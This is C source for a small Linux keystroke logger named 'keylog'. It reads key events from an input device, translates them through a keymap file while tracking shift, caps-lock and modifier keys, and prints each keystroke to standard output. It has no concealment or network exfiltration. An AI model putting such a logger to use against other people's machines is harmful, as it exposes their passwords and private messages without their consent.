
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <getopt.h>
#include <ctype.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <linux/input.h>

struct parms
{
	const char *device;
	const char *keymap;
};

struct state
{
	int fd;
	const char *normal[256];
	const char *shifted[256];
	int ismod[256];
	int isdown[256];
	int shiftcount;
	int capslock;
};

static struct parms parms =
{
	"/dev/input/event2",
	"keymap.txt"
};

static struct state state =
{
	0,
	{ NULL },
	{ NULL },
	{ 0 },
	{ 0 },
	0,
	0
};

static void die (const char *msg)
{
	perror(msg);
	exit(-1);
}

static void usage (void)
{
	fprintf(stderr, "\nUsage: keylog [-d dev] [-k keymap]\n\n");
	exit(-1);
}

static void parse_cmdline (int argc, char **argv)
{
	static struct option opts[] =
	{
	{ "device",         required_argument,   0,   'd' },
	{ "keymap",         required_argument,   0,   'k' },
	};

	char c;

	while ((c = getopt_long(argc, argv, "d:k:", opts, NULL)) != -1)
	{
		switch (c)
		{
		case 'd':
			parms.device = optarg;
			break;

		case 'k':
			parms.keymap = optarg;
			break;

		default:
			usage();
		}
	}

	if (optind < argc)
		die("excess cmdline args");
}

static void key_up (struct state *s, unsigned short c)
{
	s->isdown[c] = 0;

	if (s->shiftcount)
		if (!strcmp(s->normal[c], "S-"))
			s->shiftcount--;
}

static void key_down (struct state *s, unsigned short c)
{
	s->isdown[c] = 1;

	if (!strcmp(s->normal[c], "S-"))
		s->shiftcount++;

	if (!strcmp(s->normal[c], "<caps_lock>"))
		if (s->shiftcount == 0)
			s->capslock ^= 1;
}

static void prepare_system (const struct parms *p, struct state *s)
{
	uint8_t keys[16];
	struct stat sb;
	void *map;
	char *tok;
	int fd;
	int i,j;

	if ((fd = open(p->device, O_RDONLY)) < 0)
		die("open");

	s->fd = fd;

	if ((fd = open(p->keymap, O_RDWR)) < 0)
		die("open");

	if (fstat(fd, &sb) == -1)
		die("fstat");

	if ((map = mmap(NULL,sb.st_size,PROT_READ|PROT_WRITE,MAP_PRIVATE,fd,0)) == MAP_FAILED)
		die("mmap");

	if (close(fd) < 0)
		die("close");

	if ((tok = strtok((char*)map, "\t")) == NULL)
		die("strtok");

	while (tok != NULL)
	{
		unsigned short code;

		if (sscanf(tok, "%hd", &code) != 1)
			die("sscanf");

		if (code > 255)
			die("code");

		if ((tok = strtok(NULL,"\t")) == NULL)
			die("strtok");

		s->normal[code] = tok;

		if ((tok = strtok(NULL,"\t")) == NULL)
			die("strtok");

		s->shifted[code] = tok;

		if ((tok = strtok(NULL,"\n")) == NULL)
			die("strtok");

		switch (*tok)
		{
		case 'Y':
			s->ismod[code] = 1;
			break;

		case 'N':
			s->ismod[code] = 0;
			break;
		default:
			die("ismod");
		}

		tok = strtok(NULL,"\t");
	}

	if (ioctl (s->fd, EVIOCGKEY(sizeof keys), &keys) < 0)
		die("ioctl");

	for (i = 0; i < sizeof keys; i++)
		for (j = 0; j < 8; j++)
			if (keys[i] & (1 << j))
				key_down(s,(i*8) + j);

}

static const char * event_name (struct state *s, unsigned short c)
{
	int shift = 0;
	if (s->capslock)
		if (isalpha(*s->normal[c]))
			shift |= 1;
	if (s->shiftcount)  shift ^= 1;
	return shift ? s->shifted[c] : s->normal[c];
}

static void show_key (struct state *s, unsigned short c)
{
	printf("%s", event_name(s,c));
}

// filter out S- if event_name() will use other keymap
static int want_to_see (struct state *s, unsigned short c, int m)
{
	if (!strcmp(s->normal[c], s->shifted[c])) return 1;
	if (!strcmp(s->normal[m], "S-")) return 0;
	return 1;
}

static void show_modifiers (struct state *s, unsigned short c)
{
	int m;
	for (m=1; m<255; m++)
		if (s->isdown[m])
			if (s->ismod[m])
				if (want_to_see(s,c,m))
					show_key(s,m);
}

static void process_events (const struct parms *p, struct state *s)
{
	struct input_event e;
	int repeat = 0;

	while (read(s->fd, &e, sizeof(e)) == sizeof(e))
	{
		if (e.type != EV_KEY)
			continue;

		if (e.code > 255)
		{
			fprintf(stderr,"IGNORING code %d\n", e.code);
			continue;
		}

		switch (e.value)
		{
		case 0:   // key up
			key_up(s,e.code);
			break;

		case 1:   // key down
			key_down(s,e.code);
			repeat = -1;
			if (!s->ismod[e.code])
			{
				repeat = 1;
				show_modifiers(s,e.code);
				show_key(s,e.code);
				printf("\n");
				fflush(stdout);
			}
			break;

		case 2:   // key repeat
			if (repeat > 0)
			{
				printf("+ %d\n", repeat++);
				fflush(stdout);
			}
			break;

		default:
			die("value");
		}
	}
}

int main (int argc, char **argv)
{
	parse_cmdline(argc, argv);
	prepare_system(&parms, &state);
	process_events(&parms, &state);
	return 0;
}
